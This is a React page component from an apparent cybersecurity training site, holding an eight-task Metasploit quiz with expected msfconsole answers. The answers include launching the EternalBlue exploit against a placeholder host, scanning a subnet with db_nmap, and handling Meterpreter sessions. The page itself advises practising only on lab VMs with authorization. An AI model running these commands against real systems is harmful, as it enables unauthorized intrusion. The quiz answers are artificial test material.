'use client'
import { useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import LabExercise from '@/components/base/LabExercise';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const metasploitLabTasks = [
  {
    id: 1,
    title: 'Basic Exploit Flow',
    description: 'Search for EternalBlue exploit, set RHOSTS to 192.168.1.100, LHOST to 10.0.0.1, and run exploit.',
    expectedAnswer: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset LHOST 10.0.0.1\nexploit',
    hint: 'Use search to find ms17_010, then use the exploit path.',
  },
  {
    id: 2,
    title: 'Auxiliary Scanner',
    description: 'Use the SMB version scanner on target 10.0.0.50.',
    expectedAnswer: 'use auxiliary/scanner/smb/smb_version\nset RHOSTS 10.0.0.50\nrun',
    hint: 'Auxiliary modules are scanners and utilities, use run instead of exploit.',
  },
  {
    id: 3,
    title: 'Session Background and Return',
    description: 'After getting a Meterpreter session, background it and return to it.',
    expectedAnswer: 'background\nsessions -l\nsessions -i 1',
    hint: 'background returns to msfconsole, sessions -i reconnects.',
  },
  {
    id: 4,
    title: 'Database Workspace',
    description: 'Create a workspace named "engagement" and switch to it.',
    expectedAnswer: 'workspace -a engagement\nworkspace engagement',
    hint: 'Use -a to add, then just the name to switch.',
  },
  {
    id: 5,
    title: 'Meterpreter System Info',
    description: 'Get system information after establishing a Meterpreter session.',
    expectedAnswer: 'sysinfo',
    hint: 'sysinfo is the Meterpreter command for system details.',
  },
  {
    id: 6,
    title: 'Kill All Sessions',
    description: 'Terminate all active sessions at the end of your engagement.',
    expectedAnswer: 'sessions -K',
    hint: 'Capital K kills all sessions.',
  },
  {
    id: 7,
    title: 'Import Nmap Scan',
    description: 'Run nmap scan on 192.168.1.0/24 and import results into Metasploit database.',
    expectedAnswer: 'db_nmap -sS 192.168.1.0/24',
    hint: 'db_nmap runs nmap and imports results automatically.',
  },
  {
    id: 8,
    title: 'Generate Resource Script',
    description: 'Write commands to a resource script that sets global LHOST and uses an exploit.',
    expectedAnswer: 'setg LHOST 10.0.0.1\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nexploit',
    hint: 'Use setg for global settings that persist across modules.',
  },
];

export default function MetasploitLabPage() {
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-amber/10 border border-cyber-amber/20 text-cyber-amber text-xs font-medium font-mono mb-4">
          <i className="ri-flask-line" />
          Metasploit Section 10 of 10
        </div>
        <DocHeading level={1}>Metasploit Lab</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3">
          Apply everything you learned. Type exact msfconsole commands for each scenario.
        </p>
      </motion.div>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <LabExercise title="Metasploit Hands-On Lab" tasks={metasploitLabTasks} />
      </motion.section>

      <motion.section className="mt-8 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="cyber-card p-5">
          <h3 className="text-sm font-semibold text-white mb-2">How to Practice for Real</h3>
          <p className="text-xs text-cyber-text leading-relaxed">
            These exercises test your command syntax knowledge. Set up a vulnerable target like Metasploitable 2/3 in a VM,
            or use purpose-built labs like Metasploit Unleashed. Never scan or exploit systems without authorization.
          </p>
        </div>
        <div className="mt-6 flex gap-3">
          <a href="/metasploit" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            <i className="ri-home-line mr-1" /> Back to Metasploit Module
          </a>
        </div>
      </motion.section>
    </div>
  );
}